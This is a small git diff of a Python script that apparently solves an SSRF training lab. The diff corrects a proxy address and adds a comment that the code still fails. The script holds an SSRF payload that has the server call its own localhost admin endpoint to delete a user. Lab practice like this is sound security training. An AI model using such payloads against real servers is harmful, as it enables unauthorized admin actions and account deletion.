@@ -4,7 +4,7 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-proxies = {'http' : 'http://127.0.0.1:8080','https': 'http://127.0.0.8:8080'}
+proxies = {'http' : 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def delete_user(url):
     delete_user_url_ssrf_payload = "http://localhost/admin/delete?username=carlos"
@@ -33,3 +33,6 @@ def main():
 
 if __name__ == '__main__':
     main()
+
+## have to updte the code
+## seems to be having an error in both VMs
